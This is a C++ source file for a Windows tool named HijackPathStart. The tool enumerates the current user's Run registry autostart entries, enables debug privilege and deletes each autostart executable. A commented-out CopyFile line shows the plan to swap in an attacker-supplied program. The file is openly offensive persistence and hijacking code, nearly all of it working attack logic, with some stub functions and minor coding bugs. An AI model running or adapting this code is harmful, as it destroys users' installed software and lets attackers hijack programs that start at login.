#include "HijackPathStart.h"


HijackPathStart::HijackPathStart(const char* szReplaceExePath)
{
	std::cout << "[*] Start to Search AutoStart Item: " << endl;
	if (!QueryAutoStart()) {
		std::cout << "[-] Some Error Happend to Search AutoStart Item " << endl;
	}

	
	for (vector<string>::iterator it = vsHijcakPathList.begin(); it != vsHijcakPathList.end(); it++) {
		std::cout << "[*] Start to Hijact : " << *it <<endl;
		if (HijactPath(*it, szReplaceExePath)) {
			std::cout << "[+] Hijact Success for :" << *it << endl;
		}
	}



}

HijackPathStart::~HijackPathStart()
{
}

BOOL HijackPathStart::QueryDesktopShortcut()
{
	return 0;
}

BOOL HijackPathStart::QueryService()
{
	return 0;
}


BOOL HijackPathStart::QueryAutoStart() {
	HKEY hKEY = NULL;
	LONG lBtn = 0;
	DWORD dwDisposition = 0;

	// "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" 

	if (RegOpenKeyEx(HKEY_CURRENT_USER,
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0,
		KEY_READ,
		&hKEY) != ERROR_SUCCESS
		) {

		std::cout << "RegOpenKeyEx Error" << std::endl;
		return FALSE;
	}



#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 1024
	TCHAR    achKey[MAX_KEY_LENGTH];			// buffer for subkey name
	DWORD    cbName;							// size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");		// buffer for class name 
	DWORD    cchClassName = MAX_PATH;			// size of class string 
	DWORD    cSubKeys = 0;						// number of subkeys 
	DWORD    cbMaxSubKey;						// longest subkey size 
	DWORD    cchMaxClass;						// longest class string 
	DWORD    cValues;							// number of values for key 
	DWORD    cchMaxValue;						// longest value name 
	DWORD    cbMaxValueData;					// longest value data 
	DWORD    cbSecurityDescriptor;				// size of security descriptor 
	FILETIME ftLastWriteTime;					// last write time 

	DWORD i, retCode;

	TCHAR  achValue[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;
	
	
	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		hKEY,                    // key handle 
		achClass,                // buffer for class name 
		&cchClassName,           // size of class string 
		NULL,                    // reserved 
		&cSubKeys,                // number of subkeys 
		&cbMaxSubKey,            // longest subkey size 
		&cchMaxClass,            // longest class string 
		&cValues,                // number of values for this key 
		&cchMaxValue,            // longest value name 
		&cbMaxValueData,         // longest value data 
		&cbSecurityDescriptor,   // security descriptor 
		&ftLastWriteTime);       // last write time 

	if (retCode != ERROR_SUCCESS) {
		std::cout << "RegQueryInfoKey Error" << std::endl;
		return FALSE;
	}

	for (i = 0; i < cValues; i++)
	{
		cchValue = MAX_VALUE_NAME;
		achValue[0] = '\0';
		retCode = RegEnumValue(hKEY, i,
			achValue,
			&cchValue,
			NULL,
			NULL,
			NULL,
			NULL);


		// Get the value type and size
		DWORD dataSize = 0;
		DWORD dwType = 1;
		char* returnDataBuffer = NULL;

		retCode = RegQueryValueEx(hKEY,
			achValue,
			NULL,
			&dwType,
			NULL,
			&dataSize
		);

		switch (dwType)
		{
		case REG_SZ:
			returnDataBuffer = (char *)malloc(dataSize);
			retCode = RegQueryValueEx(hKEY, achValue, NULL, NULL, (LPBYTE)returnDataBuffer, &dataSize);
			vsHijcakPathList.push_back(returnDataBuffer);
			ZeroMemory(returnDataBuffer, dataSize);
			delete returnDataBuffer;
			
		default:
			break;
		}
		


	}



	return TRUE;
}

BOOL HijackPathStart::HijactPath(string strbeReplacePath, const char* szReplaceExePath)
{

	//  "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start /prefetch:5
	//  "C:\Users\Administrator\AppData\Roaming\baidu\BaiduNetdisk\YunDetectService.exe"
	
	string args = "";
	string cmd_line;

	EnableDebugPriv(SE_DEBUG_NAME);

	system("whoami");

	size_t first_index =  strbeReplacePath.find("\"");
	if (first_index != strbeReplacePath.npos) {
		size_t second_index = strbeReplacePath.find("\"", first_index + 1);
		cmd_line = strbeReplacePath.substr(first_index + 1, second_index - first_index -1);

		if (strbeReplacePath.length() != second_index + 1) {
			args = strbeReplacePath.substr(second_index +1, strbeReplacePath.length()+1);
		}
	}

	
	if (DeleteFile(cmd_line.c_str()) != 0)
	{

		cout << "delete success : " << cmd_line.c_str() << endl;
	}
	else {
		cout << "GG ,error code->0x" << hex << GetLastError() << endl;
	}

	//CopyFile(szReplaceExePath, cmd_line.c_str(), TRUE);

	return 0;
}
BOOL  HijackPathStart::EnableDebugPriv(LPCSTR name)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tp;
	// 打开进程令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		printf("[!]Get Process Token Error!\n");
		return false;
	}
	// 获取权限Luid
	if (!LookupPrivilegeValue(NULL, name, &luid))
	{
		printf("[!]Get Privilege Error!\n");
		return false;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	// 修改进程权限
	if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		printf("[!]Adjust Privilege Error!\n");
		return false;
	}
	return true;
}
